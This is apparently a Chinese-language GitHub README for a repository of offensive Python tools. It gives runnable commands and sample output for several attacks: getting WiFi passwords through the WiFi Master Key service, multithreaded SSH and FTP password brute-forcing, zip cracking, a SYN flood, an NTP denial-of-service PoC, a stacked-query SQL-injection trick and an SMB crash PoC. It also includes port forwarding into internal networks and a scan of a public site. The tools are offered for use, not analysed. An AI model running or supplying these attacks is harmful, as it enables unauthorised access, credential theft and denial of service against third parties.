# Hacking Tools Demo
simple hack tools 


### attackWiFi.py 一个获取wifi密码的工具
```
破解原理：
	破解wifi万能钥匙的接口协议，非抓包暴力破解，wifi万能钥匙的服务端存储了大量的wifi密码相关信息
	通过向接口提供ssid和bssid信息，获取真实的wifi密码
	这里要感谢zke1ev3n逆向了wifi万能钥匙的安卓客户端
	本脚本完善了破解程序，增加了容错机制，获得的密码在response中其实是urlencode的，本脚本也增加了decode解码
查看帮助
➜  Hacking git:(master) ✗ py attackWiFi.py -h
Usage: use:
	--ssid <wifi ssid> --bssid <wifi bssid>
	Example: python attackWiFi.py --ssid ssid --bssid bssid

Options:
  -h, --help          show this help message and exit
  --ssid=WIFI_SSID    the wifi ssid info
  --bssid=WIFI_BSSID  the wifi bssid info

第一步是要获得wifi的ssid和bssid信息，我演示的环境是Mac环境，其他环境请自行寻找下获取ssid和bssid的工具
Mac环境：
	执行：airport -s 获取所有wifi相关信息，这里部分信息进行了打码：
	因为我在执行之前建过一个软链接：ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
	有人私信我 airport -s 执行显示不存在的命令，教程很简单，看不懂说明基础还不好，这种问题完全可以google解决 
```
![](https://github.com/LockGit/Hacking/blob/master/img/ssid.png)
```
上一步获得了ssid和bssid信息
执行获取密码：
python attackWiFi.py --ssid xxx --bssid ****
xxx 表示wifi的名称：比如wifi名叫：home
**** 表示wifi的bssid信息：比如 17:71:94:14:84:0d (随便写的)
那么获取密码就是：
python attackWiFi.py --ssid home --bssid 17:71:94:14:84:0d
成功了会显示password is: xxxxxxx
也有可能会失败，貌似服务端是有check的，操作多了，会获取失败，这个时候可以换一个网络环境测试，或者换一个wifi测试
```


### TcpPortForward.py 端口转发tool
```
使用场景:

一：
A服务器在内网，公网无法直接访问这台服务器，但是A服务器可以联网访问公网的B服务器（假设IP为222.2.2.2）。
我们也可以访问公网的B服务器。我们的目标是访问A服务器的22端口。那么可以这样：

1. 在B服务器上运行：
./TcpPortForward.py l:10001 l:10002
表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了。

2. 在A服务器上运行：
./TcpPortForward.py c:localhost:22 c:222.2.2.2:10001
表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了。

3. 然后我们就可以这样来访问A服务器的22端口了：
ssh 222.2.2.2 -p 10002
原理很简单，这个命令执行后，B服务器的10002端口接收到的任何数据都会传给10001端口，此时，A服务器是连接了B服务器的10001端口的，数据就会传给A服务器，最终进入A服务器的22端口。

二：
不用更多举例了，TcpPortForward.py的l与c两个参数可以进行灵活的两两组合，多台服务器之间只要搞明白数据流方向，那么就能满足很多场景的需求。
```



### zipattack.py zip加密文件暴力破解

```
帮助说明：  python zipattack.py -h

测试：
zip test.zip *.gif -e 

进行暴力破解：
python zipattack.py -f test.zip -d password.txt
```


### createDict.py 生成一个简单的密码破解字典
```
python createDict.py 

按ctrl+c 停止生成
```

### PortScan.py 多线程端口扫描器
```
More Help: PortScan.py -h

测试:
	python PortScan.py -H www.baidu.com -p 80 443 110
	➜  py python PortScan.py -H www.baidu.com -p 80 443 110 
		[+] Scan Results for: 119.75.218.70
		Scanning port 443
		Scanning port 110
		Scanning port 80
		[+]443/tcp open
		[+] HTTP/1.1 302 Moved Temporarily
		Server: bfe/1.0.8.18
		Date: Sun, 06 Nov 2016 08:43:40 GMT
		Content-T
		[-]110/tcp closed
		[-]80/tcp closed
	As you can see , www.baidu.com port 443 is open ,but port 80 show closed , baidu have security scan strategy ? Because Telnet www.baidu.com 80 success
	You can Test another website
	Also, You can local test , The python script support domain or ip mode
	Example:
		python PortScan.py -H 127.0.0.1 -p 80
	Author By Lock 
```

### sshAttack.py 多线程ssh密码暴力破解
```
测试：
	➜  py python sshAttack.py -h                                                    
		Usage: -H <target host> -u <user> -f <password list>

		Options:
		  -h, --help     show this help message and exit
		  -H TGTHOST     specify target host
		  -f PASSWDFILE  specify password file
		  -u USER        specify the user
		  -c COUNT       specify the max ssh connect count , default 5
	
	py python sshAttack.py -H 192.168.2.201 -u zhanghe -f /Users/lock/1.txt -c 20
	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断

例：
➜  py python sshAttack.py -H 192.168.1.100 -u root -f password.md -c 20
		[-] Testing: 1111
		[-] Testing: 2222
		[-] Testing: 3333
		[-] Testing: 111111
		[-] Testing: 123123
		[-] Testing: 123456
		[+] Good , Key Found: 123456
```

### ftpAttack.py 多线程ftp密码暴力破解
```
测试：
➜  py python ftpAttack.py -h
	Usage: -H <target host> -f <password list>

	Options:
	  -h, --help     show this help message and exit
	  -H TGTHOST     specify target host
	  -f PASSWDFILE  specify password file,like username:password format file
	  -d DELAY       attack time delay set default 1s

➜  py python ftpAttack.py -H 127.0.0.1 -f userpass.md -d 1

	[-] 127.0.0.1 FTP Anonymous Logon Failed.
	[+] Trying: root/aaa

	[-] Could not brute force FTP credentials.

	[+] Trying: lock/mmm

	[-] Could not brute force FTP credentials.
	[+] Trying: alice/123


	[-] Could not brute force FTP credentials.

	The default test delay time is 0s , test default account is anonymous , if success, will show user name and password.
	userpass.md is username and password file,the file format like below:
		root:123
		hello:456
		alice:789
		test:12345
```

### synFlood.py 一个简单的 TCP SYN 洪水攻击 python版
```
More Detail:
python synFlood.py -h
1,用 Scapy 简单的复制一个 TCP SYN 洪水攻击，将制作一些 IP 数据包,  TCP 513 目标端口。
2,运行攻击发送 TCP SYN 数据包耗尽目标主机资源，填满它的连接队列，基本瘫 痪目标发送 TCP 重置包的能力。
3,netstat -an 大量的半链接状态 SYN_RECV

可能需要的依赖：
brew install --with-python libdnet

pip install scapy
pip install pcapy
pip install pydumbnet

执行效果:
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
....
```

### ntpDenialService.py 一个使ntp拒绝服务的poc代码
```
构造一个特殊的数据包，ntpd没有默认开启trap服务，如果trap被开启，攻击者就能通过特别构造的数据包导致空指针引、ntpd崩溃，进而导致服务器拒绝服务。
测试：
监听本地udp 1111 端口
➜  ~ nc -l -u 0 1111

执行：
➜  Hacking git:(master) ✗ python ntpDenialService.py 127.0.0.1 1111
[-] Sending payload to 127.0.0.1:1111 ...
[+] Done!

➜  ~ nc -l -u 0 1111

6nonce, laddr=[]:Hrags=32, laddr=[]:WOP2, laddr=[]:WOP

接受到这个特殊的数据包，ntpd崩溃，形成拒绝服务
```

### 分享一个SQL注入的技巧
```
审计开源框架/cms的时候可能会遇到一些有意思的注入漏洞
当以pdo的方式连接mysql，也就是说可以多语句执行的时候
然后，参考如下：

python:
import binascii
s='select * from x limit 1;'

print binascii.b2a_hex(s)
# 获得16进制数据，73656c656374202a2066726f6d2078206c696d697420313b

mysql -uroot
set @a:=0x73656c656374202a2066726f6d2078206c696d697420313b;

prepare s from @a;

execute s;

mysql root@localhost:test> execute s;
+------+----------+-------+
|   id |   is_reg |   pid |
|------+----------+-------|
|    1 |        1 |     0 |
+------+----------+-------+
1 row in set
Time: 0.002s
```

### attackSmb/win10.py 一个SMB漏洞的Poc代码
```
此漏洞主要影响Windows Server 2012/2016、Win8/8.1以及Win10系统。
攻击者可以模拟成一个SMB服务器，诱使客户端发起SMB请求来触发漏洞。
攻击者也可以通过中间人方式“毒化”SMB回应，插入恶意的SMB回复实现拒绝服务或控制受害系统。
```
![](https://github.com/LockGit/Hacking/blob/master/attackSmb/attacksmb.png)
